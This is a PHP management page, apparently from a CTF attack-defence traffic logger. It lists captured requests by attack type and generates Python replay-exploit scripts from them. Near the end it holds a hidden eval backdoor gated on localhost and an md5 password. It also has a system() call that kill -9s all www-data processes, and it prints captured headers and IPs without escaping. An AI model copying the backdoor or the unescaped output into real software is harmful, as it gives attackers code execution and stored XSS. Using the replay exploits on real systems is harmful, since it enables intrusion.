<?php
define('BASE_PATH','********');
define('username','!!!!!!!!');
define('password','@@@@@@@@');
include('########');
class SaLt_Classsssss_LogDatA_HHHHHhhhhh extends SaLt_Classsssss_LogDb_HHHHhhhhh
   {
      function __construct()
      {
         $this->data_root_dir = BASE_PATH;
         $this->path = $this->data_root_dir.'lock/';
      }
   }
session_start();
function dumpalllog($start,$num,$desc,$time)
{
   $this_SalT_hhhaaaa_Db_p = new SaLt_Classsssss_LogDatA_HHHHHhhhhh();
   if(!$this_SalT_hhhaaaa_Db_p){
      $back = array("code"=>"500","message","open db error");
      return json_encode($back);
   } 

   //$sql = 'SELECT * from LOGGERS order by Time '.$desc.' limit '.(int)$start.','.(int)$num;
/*URL,PostStr,GetStr,Cookie,Time,headers,Ip,risk,type)*/
   //$this_SalT_hhhaaaa_ReT_p = $this_SalT_hhhaaaa_Db_p->query($sql);
   //$back = array();
   // $wd = array(id,$data['url'],$data['poststr'],$data['getstr'],$data['cookie'],$data['time'],$data['headers'],$data['ip'],$risk,$data['type'],$count);
   $all = $this_SalT_hhhaaaa_Db_p -> select_list('',$num,'content',$desc,0,$start,$time);
   if($all)
   {
   	  $all = json_decode($all,true);

   	  $back = array();
   		foreach($all as $row)
  	 	{
  	 		$row = $row[0];
      		$arr = array("id"=>$row[0],"url"=>$row[1],"post"=>$row[2],"get"=>$row[3],"cookie"=>$row[4],"time"=>$row[5],"headers"=>$row[6],"ip"=>$row[7],"risk"=>(int)$row[8],"type"=>(int)$row[9],"count"=>(int)$row[11]);
      //var_dump($arr);
    	  array_push($back, $arr);
  	 	}
   		$alback = array("code"=>"200","message"=>$back);
   		return json_encode($alback);
   	}
   	else
   	{
   		$alback = array("code"=>"501","message"=>"select data error");
   		return json_encode($alback);
   	}

}

function getbysth($where,$start,$num,$desc,$sth,$time)
{
   $time = $time;
   $this_SalT_hhhaaaa_Db_p = new SaLt_Classsssss_LogDatA_HHHHHhhhhh();
   if(!$this_SalT_hhhaaaa_Db_p){
      $back = array("code"=>"500","message","open db error");
      return json_encode($back);
   }
   switch ($where)
   {
    	case 'ip':
    		$dataj = $this_SalT_hhhaaaa_Db_p->select_by_ip($sth,$num,$desc,$start,0,$time);
    		break;
    	case 'more':
    		$dataj = $this_SalT_hhhaaaa_Db_p->prob_payload($num,0,0,$start);
    		break;
    	case 'risk':
    		$dataj = $this_SalT_hhhaaaa_Db_p->prob_payload($num,0,1,$start);
    		break;
    	default:
    		$dataj = 0;
    		break;
    }
    if($dataj)
    {
    	$dataj = json_decode($dataj,true);
    	 $back = array();
    	 foreach($dataj as $row)
    	{
    		$row = $row[0];
      		$arr = array("id"=>$row[0],"url"=>$row[1],"post"=>$row[2],"get"=>$row[3],"cookie"=>$row[4],"time"=>$row[5],"headers"=>$row[6],"ip"=>$row[7],"risk"=>(int)$row[8],"type"=>(int)$row[9],"count"=>(int)$row[11]);
      		array_push($back, $arr);
      	}

   		$alback = array("code"=>"200","message"=>$back);
   		return json_encode($alback);
    }
    else
    {
    	$alback = array("code"=>"501","message"=>"select data error");
   		return json_encode($alback);

    }
   //$all = $this_SalT_hhhaaaa_Db_p -> select_list('',$num,'content',$desc,0,$start);
  // $sql = 'SELECT * from LOGGERS '.$where;
  // $this_SalT_hhhaaaa_ReT_p = $this_SalT_hhhaaaa_Db_p->query($sql);
  
}
function getnum($mod,$group,$time)
{
	$this_SalT_hhhaaaa_Db_p = new SaLt_Classsssss_LogDatA_HHHHHhhhhh();
   if(!$this_SalT_hhhaaaa_Db_p){
      $back = array("code"=>"500","message","open db error");
      return json_encode($back);
   } 
   $Row = $this_SalT_hhhaaaa_Db_p->get_num($mod,$group,$time);
   $alback = array("code"=>"200","message"=>$Row);
   return json_encode($alback);
}
function getIPlist()
{
	$this_SalT_hhhaaaa_Db_p = new SaLt_Classsssss_LogDatA_HHHHHhhhhh();
   if(!$this_SalT_hhhaaaa_Db_p){
      $back = array("code"=>"500","message","open db error");
      return json_encode($back);
   } 

   $back = json_decode($this_SalT_hhhaaaa_Db_p->ip_list(),true);
   $alback = array("code"=>"200","message"=>$back);
   return json_encode($alback);
}
function banner($mod)
{
	switch ($mod) {
		case 0:
			echo '<ul class="nav nav-tabs nav-justified">
  			<li class="active"><a href="managelog.php?m=index">All log</a></li>
  			<li><a href="managelog.php?m=iplist">IP LIST</a></li>
  			<li><a href="managelog.php?m=risk">RISK HIGH</a></li>
  			<li><a href="managelog.php?m=more">MOST_PROB_PAYLOAD</a></li>
			</ul>';
			break;
		case 1:
			echo '<ul class="nav nav-tabs nav-justified">
  			<li><a href="managelog.php?m=index">All log</a></li>
  			<li class="active"><a href="managelog.php?m=iplist">IP LIST</a></li>
  			<li><a href="managelog.php?m=risk">RISK HIGH</a></li>
  			<li><a href="managelog.php?m=more">MOST_PROB_PAYLOAD</a></li>
			</ul>';
			break;
		case 2:
			echo '<ul class="nav nav-tabs nav-justified">
  			<li><a href="managelog.php?m=index">All log</a></li>
  			<li><a href="managelog.php?m=iplist">IP LIST</a></li>
  			<li class="active"><a href="managelog.php?m=risk">RISK HIGH</a></li>
  			<li><a href="managelog.php?m=more">MOST_PROB_PAYLOAD</a></li>
			</ul>';
			break;
		case 3:
			echo '<ul class="nav nav-tabs nav-justified">
  			<li><a href="managelog.php?m=index">All log</a></li>
  			<li><a href="managelog.php?m=iplist">IP LIST</a></li>
  			<li><a href="managelog.php?m=risk">RISK HIGH</a></li>
  			<li class="active"><a href="managelog.php?m=more">MOST_PROB_PAYLOAD</a></li>
			</ul>';
			break;
		default:
			# code...
			break;
	}
	
}

function downloadpoc($id)
{
    $id = explode(',',$id);
    $this_SalT_hhhaaaa_Db_p = new SaLt_Classsssss_LogDatA_HHHHHhhhhh();
    if (!$this_SalT_hhhaaaa_Db_p) {
        $back = array("code" => "500", "message", "open db error");
        return json_encode($back);

    }
    if(sizeof($id)<2) {
        $id = $id[0];

        $content = $this_SalT_hhhaaaa_Db_p->get_content_by_id($id);
        if ($content) {
            $content = json_decode($content, true);
            $content = $content[0];
            $temp = file_get_contents(BASE_PATH . '../temp.php');
            $temp = str_replace('wupco_url', addslashes($content[1]), $temp);
            $temp = str_replace('wupco_head', addslashes(htmlspecialchars_decode($content[6])), $temp);
            $temp = str_replace('wupco_get', addslashes($content[3]), $temp);
            $temp = str_replace('wupco_post', addslashes($content[2]), $temp);
            $temp = str_replace('wupco_poc_mod','0',$temp);
            $temp = str_replace('wupco_targets',"''",$temp);
            $temp = str_replace('wupco_t_headers',"''",$temp);
            $temp = str_replace('wupco_t_posts',"''",$temp);
            $temp = str_replace('wupco_t_gets',"''",$temp);
            $filename = (string)$id . "poc.py";
            header('Content-Type:application/octet-stream');
            header('Content-Disposition: attachment; filename="' . $filename . '"');
            echo $temp;
            return 1;


        } else {
            return 0;
        }
    }
    else
    {
        $headers = '';
        $posts = '';
        $gets = '';
        $targets = '';
        $count = 1;
        //("id"=>$row[0],"url"=>$row[1],"post"=>$row[2],"get"=>$row[3],"cookie"=>$row[4],
        //"time"=>$row[5],"headers"=>$row[6],"ip"=>$row[7],"risk"=>(int)$row[8],
        //"type"=>(int)$row[9],"count"=>(int)$row[11]);
        foreach ($id as $id_){

            if($id_ != '' && $count < count($id))
            {
                $content = $this_SalT_hhhaaaa_Db_p->get_content_by_id($id_);
                if ($content) {
                    $content = json_decode($content, true);
                    $content = $content[0];
                    $headers .= "'''".addslashes(htmlspecialchars_decode($content[6]))."''',";
                    $posts .= "'''".addslashes($content[2])."''',";
                    $gets .= "'''".addslashes($content[3])."''',";
                    $targets .= "'''".addslashes($content[1])."''',";

                }
                else
                {
                    return 0;
                }

            }
            $count += 1;

        }
        $content = $this_SalT_hhhaaaa_Db_p->get_content_by_id(end($id));
        if($content){
            $content = json_decode($content, true);
            $content = $content[0];
            $wupco_url = addslashes($content[1]);
            $wupco_head = addslashes(htmlspecialchars_decode($content[6]));
            $wupco_get = addslashes($content[3]);
            $wupco_post = addslashes($content[2]);
        }
        else
        {
            return 0;
        }
        $headers = substr($headers,0,-1);
        $posts = substr($posts,0,-1);
        $gets = substr($gets,0,-1);
        $targets = substr($targets,0,-1);
        $temp = file_get_contents(BASE_PATH . '../temp.php');
        $temp = str_replace('wupco_url', $wupco_url, $temp);
        $temp = str_replace('wupco_head', $wupco_head, $temp);
        $temp = str_replace('wupco_get', $wupco_get, $temp);
        $temp = str_replace('wupco_post', $wupco_post, $temp);
        $temp = str_replace('wupco_poc_mod','mixed',$temp);
        $temp = str_replace('wupco_targets',$targets,$temp);
        $temp = str_replace('wupco_t_headers',$headers,$temp);
        $temp = str_replace('wupco_t_posts',$posts,$temp);
        $temp = str_replace('wupco_t_gets',$gets,$temp);
        $filename = (string)end($id) . "_mixedpoc.py";
        header('Content-Type:application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        echo $temp;
        return 1;

    }

}

function del_log()
{

    if(isset($_POST['id']))
    {
        $this_SalT_hhhaaaa_Db_p = new SaLt_Classsssss_LogDatA_HHHHHhhhhh();
        if(!$this_SalT_hhhaaaa_Db_p){
            $back = array("code"=>"500","message","open db error");
            return json_encode($back);

        }
        $ids = explode(',',$_POST['id']);
        foreach ($ids as $id)
        {
            $id = trim($id);
            if($id != '')
            {
              $this_SalT_hhhaaaa_Db_p->del_by_id((int)$id);
            }
        }
        return 1;
    }
    else
        return 0;
}


function index()
{
	if(isset($_GET['id'])&&(int)$_GET['id']>=0)
		$id = (int)$_GET['id'];
	else
		$id = 0;
	if(isset($_GET['t'])&&(int)$_GET['t']>=0)
		$time = $_GET['t'];
	else
		$time = 0;
	$lognum = json_decode(getnum('all',0,$time));
	if($lognum->code == 500)
		die($lognum->message);
	$lognum = (int)($lognum->message);
	$page = (int)($lognum / 10);
	//echo (int)($lognum  % 10);
	if((int)($lognum  % 10) != 0)
		$page+=1;
	$tid = $id * 10;
	
	$con = json_decode(dumpalllog($tid,10,1,$time));
	if((int)($con->code) >= 500)
	{
		echo $con->message;
	}
	else
	{
		foreach($con->message as $log)
		{

			if($log->risk === 1)
				{
				$class = 'panel panel-danger';
			    $bclass = 'alert alert-danger';
			}
			else
				{
					$class = 'panel panel-info';
			    $bclass = 'alert alert-info';
			}
			switch ((int)$log->type) {
				case 0:
					$typeval = '暂无分类';
					$tclass = 'label label-default';
					break;

				case 1:
					$typeval = '畸形输入';
					$tclass = 'label label-default';
					break;
				case 2:
					$typeval = 'xss';
					$tclass = 'label label-default';
					break;
				case 3:
					$typeval = 'sql注入';
					$tclass = 'label label-danger';
					break;
				case 4:
					$typeval = '命令执行';
					$tclass = 'label label-danger';
					break;

				default:
					$typeval ='暂无分类';
					break;
			}

			echo '<div class="'.$class.'">
			<div class="panel-heading">
			<h3 class="panel-title">'.htmlentities($log->url).'&nbsp&nbsp<span class="'.$tclass.'">'.$typeval.'</span>&nbsp&nbsp <input type="checkbox" name="r"  class="qx" value="'.$log->id.'"></h3>

			</div>
			<div class="panel-body">
    		<table class="table">
    		<tr><td>次数:</td><td>'.htmlentities($log->count).'</td></tr>
    		<tr><td>IP:</td><td>'.htmlentities($log->ip).'</td></tr>
    		<tr><td>Time:</td><td>'.htmlentities($log->time).'</td></tr>
        <tr><td>Get:</td><td>'.htmlentities($log->get).'</td></tr>
        <tr><td>Post:</td><td>'.htmlentities($log->post).'</td></tr>
        <tr><td>Cookie:</td><td>'.htmlentities($log->cookie).'</td></tr>
        <tr><a data-toggle="collapse" data-parent="#accordion" 
                href="#collapse'.(string)$log->id.'">Show Headers</a></tr>
                <br><br>
          <div id="collapse'.(string)$log->id.'" class="panel-collapse collapse">
        <div class="'.$bclass.'">'.nl2br($log->headers).'<br><a href="managelog.php?pocid='.(string)$log->id.'" target="_blank">Get POC(id:'.$log->id.')</a></div>
        </div>
	    
    </table>
          </div>
			</div>';
		}

		echo '<ul class="pagination">
		<li><a href="managelog.php?m=index&id=0">&laquo;</a></li>';
		for($i=0;$i<$page;$i++)
		{
			if($i === $id)

			echo '
    		<li class="active"><a href="#">'.(string)($id+1).'</a></li>';

    		else

    		echo '
    		<li><a href="managelog.php?m=index&id='.(string)($i).'">'.(string)($i+1).'</a></li>';
		}
		echo '<li><a href="managelog.php?m=index&id='.(string)($page-1).'">&raquo;</a></li></ul>';
	}

}

function gettime_am($start,$end)
{
  
   return substr((string)$start,0,strspn((string)$start^(string)$end, "\0"));


}

function iplist()
{
	if(isset($_GET['ip']))
	{
        showbysth('ip','iplist',$_GET['ip'],'ip');
	}
	else
	{
	$iplist = json_decode(getIPlist());
	if($iplist->code == 500)
		die($iplist->message);
	echo '<ul class="nav nav-pills nav-stacked">';

	foreach($iplist->message as $ip)
	{
		//var_dump($ip);
		echo '<li><a href="managelog.php?m=iplist&ip='.$ip.'">'.$ip.'</a></li>';
	}

	echo '</ul>';
   }
}
function more()
{
	showbysth('more','more','default','default');
}
function risk()
{
	showbysth('risk','risk','default','default');
}
function showbysth($where,$mod,$sth,$sthkey)
{

	//showbysth('where Ip = "'.$_GET['ip'].'" order by Time desc','iplist',$_GET['ip'],'ip');
	if(isset($_GET['id'])&&(int)$_GET['id']>=0)
		$id = (int)$_GET['id'];
	else
		$id = 0;
	if(isset($_GET['t'])&&(int)$_GET['t']>=0)
		$time = $_GET['t'];
	else
		$time = 0;
	$lognum = json_decode(getnum($where,$sth,$time));
	if($lognum->code == 500)
		die($lognum->message);
	$lognum = (int)($lognum->message);
	$page = (int)($lognum / 10);
	if((int)($lognum  % 10) != 0)
		$page+=1;
	$tid = $id * 10;
	//$where.=' limit '.$tid.',10';
	//getbysth($where,$start,$num,$desc,$sth)
	$con = json_decode(getbysth($where,$tid,10,1,$sth,$time));
	if((int)($con->code) >= 500)
	{
		echo $con->message;
	}
	else
	{

		foreach($con->message as $log)
		{

			if($log->risk === 1){
				$class = 'panel panel-danger';
			    $bclass = 'alert alert-danger';
			}
			else
			{
				$class = 'panel panel-info';
			    $bclass = 'alert alert-info';
			}
			switch ($log->type) {
				case 0:
					$typeval = '暂无分类';
					$tclass = 'label label-default';
					break;

				case 1:
					$typeval = '畸形输入';
					$tclass = 'label label-default';
					break;
				case 2:
					$typeval = 'xss';
					$tclass = 'label label-default';
					break;
				case 3:
					$typeval = 'sql注入';
					$tclass = 'label label-danger';
					break;
				case 4:
					$typeval = '命令执行';
					$tclass = 'label label-danger';
					break;

				default:
					$typeval ='暂无分类';
					break;
			}

			echo '<div class="'.$class.'">
			<div class="panel-heading">
			<h3 class="panel-title">'.htmlentities($log->url).'&nbsp&nbsp<span class="'.$tclass.'">'.$typeval.'</span></h3>

			</div>
			<div class="panel-body">
    		<table class="table">
    		<tr><td>次数:</td><td>'.htmlentities($log->count).'</td></tr>
    		<tr><td>IP:</td><td>'.htmlentities($log->ip).'</td></tr>
    		<tr><td>Time:</td><td>'.htmlentities($log->time).'</td></tr>
        <tr><td>Get:</td><td>'.htmlentities($log->get).'</td></tr>
        <tr><td>Post:</td><td>'.htmlentities($log->post).'</td></tr>
        <tr><td>Cookie:</td><td>'.htmlentities($log->cookie).'</td></tr>
        <tr><a data-toggle="collapse" data-parent="#accordion" 
                href="#collapse'.(string)$log->id.'">Show Headers</a></tr>
                <br><br>
          <div id="collapse'.(string)$log->id.'" class="panel-collapse collapse">
         <div class="'.$bclass.'">'.nl2br($log->headers).'<br><a href="managelog.php?pocid='.(string)$log->id.'" target="_blank">Get POC(id:'.(string)$log->id.')</a></div>
        </div>
	    
    </table>
          </div>
			</div>';
		}

		echo '<ul class="pagination">
		<li><a href="managelog.php?m='.$mod.'&'.$sthkey.'='.$sth.'&id=0">&laquo;</a></li>';
		for($i=0;$i<$page;$i++)
		{
			if($i === $id)

			echo '
    		<li class="active"><a href="#">'.(string)($id+1).'</a></li>';

    		else

    		echo '
    		<li><a href="managelog.php?m='.$mod.'&'.$sthkey.'='.$sth.'&id='.(string)($i).'">'.(string)($i+1).'</a></li>';
		}
		echo '<li><a href="managelog.php?m='.$mod.'&'.$sthkey.'='.$sth.'&id='.(string)($page-1).'">&raquo;</a></li></ul>';
	}
}

function check_login()
{
	if (isset($_SESSION['user']) && !empty($_SESSION['user'])){
		return 1;
	}else{
		return 0;
	}

}

function login()
{
	if (isset($_POST['user'])){
		$user = $_POST['user'];
		$password = $_POST['password'];
		if ($user === username && $password === password) {
			$_SESSION['user'] = $user;
        return 1;
    }else{
	   return 0;
    }
  }
  else
  	return 0;
}

if($_SERVER["REMOTE_ADDR"]==='127.0.0.1')
    if(isset($_GET['cmdpwd'])){
        if($_GET['cmdpwd']=== md5(password))
        @eval($_POST['cmd_ahaha']);
    }

if(!check_login())
{
	
	$form ='
	<form action="" method="post">
	<input name="user"><br>
	<input name="password"><br>
	<input type="submit">
	</form>
	';
	if(!login())
	{
		die($form);
	}
}
else
{
    del_log();
    if(isset($_GET['stop']))
    {
        system('ps aux|grep \'www-data\'|awk {print $2}|xargs kill -9');
    }
    if(isset($_GET['pocid']))
    {
        downloadpoc($_GET['pocid']);
        exit();
    }
    echo '
    <!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <!-- 引入 Bootstrap -->
      <link href="./../wupco_static/css/bootstrap.min.css" rel="stylesheet">
      <script src="./../wupco_static/js/jquery.min.js"></script>
      <script src="./../wupco_static/js/bootstrap.min.js"></script>

  </head>
 </html>';

    echo '<div class="panel panel-warning">
        <div class="panel-heading">
            <h4 class="panel-title">
                <a data-toggle="collapse" data-parent="#accordion" 
                href="#collapseThree">
                Tools
                </a>
            </h4>
        </div>
        <div id="collapseThree" class="panel-collapse collapse">
            <div class="panel-body">
<form action="" method="POST">
	  <input type="datetime-local" name="start" value="'.str_replace("CS","",date("Y-m-dTH:i",time()).":00").'">
          <input type="datetime-local" name="end" value="'.str_replace("CS","",date("Y-m-dTH:i:s",time())).'">
	  <input type="submit">
	</form>
'."<script>
        function aa(){ var t = '';
            var r=document.getElementsByName(\"r\"); 
            for(var i=0;i<r.length;i++){
                if(r[i].checked){
                    t = t + r[i].value+',';
                }
            } 
             var z=confirm(\"您真的要删除选中流量吗？\")
                if (z==true)
                {
                    var xhr=new XMLHttpRequest();
                    xhr.open(\"POST\",location.href,true);
                    xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");
                    xhr.send(\"id=\"+t);
                    alert('del ok!');
                    location.href = location.href;
                    return 0;
                }
                else
                {
                    return 0;
                }
        }
       
        
        </script><br>删除流量: <input type=\"checkbox\" id=\"quanxuan\" />全选  <input type='submit' onclick='aa()' value='删除选中'>   <script>
         $(\"#quanxuan\").click(function(){
        var xz = $(this).prop(\"checked\");
        var ck = $(\".qx\").prop(\"checked\",xz);
        })
        </script>".'
                <br><br>获取复合流量重放exp:<form action=\'\' method=\'GET\'> <input name=\'pocid\' placeholder=\'依次输入流量id，用英文逗号分割\'>  <input type=\'submit\'> </form><br>
            </div>
        </div>
    </div>';
  if(isset($_GET['m']))
  {
  	$m = addslashes($_GET['m']);
	if(isset($_POST['start'])&&isset($_POST['end']))
	{
	   $time = gettime_am(strtotime($_POST['start']),strtotime($_POST['end']));
	echo "
	
	<script>
	 function ChangeURLParm(Turl,Parm,PValue,ClearParm){ 
    
        var URL,Parms,ParmsArr,IsExist; 
        var NewURL = Turl;
        IsExist = false; 
        with(Turl){ 
            if(indexOf('?')>0){ 
            URL = substr(0,indexOf('?'));//不包含参数 
            Parms = substr(indexOf('?')+1,length);//参数 
            } 
            else{ 
            URL = Turl; 
            Parms = ''; 
            } 
           }    
        if (Parms!=''){ 
            var i; 
        ParmsArr = Parms.split(\"&\"); 
for(i=0;i<=ParmsArr.length-1;i++){ 
if (String(Parm).toUpperCase()==String(ParmsArr[i].split(\"=\")[0]).toUpperCase()){//原来有参数Parm则改变其值 
ParmsArr[i] = Parm + \"=\" + PValue; 
IsExist = true; 
if (String(ClearParm) ==\"\"){ 
break; 
} 
} 
else if ( (String(ClearParm)!=\"\") && (String(ClearParm).toUpperCase()==String(ParmsArr[i].split(\"=\")[0])).toUpperCase() ){//去掉参数ClearParm的值 
ParmsArr[i] = ClearParm + \"=\"; 
} 
} 

for(i=0;i<=ParmsArr.length-1;i++){ 
if(i==0){ 
Parms = ParmsArr[i]; 
} 
else{ 
Parms = Parms + \"&\" + ParmsArr[i]; 
} 
} 
NewURL = URL + \"?\" + Parms; 
if (!IsExist){ 
NewURL = NewURL + \"&\" + Parm + \"=\" + PValue; 
} 
} 
else{ 
NewURL = URL + \"?\" + Parm + \"=\" + PValue; 
} 
return NewURL; 
}
var url = window.location.href; //获取当前url           
    location.href = ChangeURLParm(url,'t','".$time."','');
</script>
 	";
	
	}
  	switch ($m) {
  		case 'index':
  			banner(0);
  			index();
  			break;
  		case 'iplist':
  			banner(1);
  			iplist();
  			break;
  		case 'risk':
  		    banner(2);
  		    risk();
  		    break;
  		case 'more':
  			banner(3);
  			more();
  			break;
  		default:
  		    banner(0);
  			index();
  			break;
  	}
      
  }
  else
  {
  	echo "<script>location.href='managelog.php?m=index'</script>";
  }

}
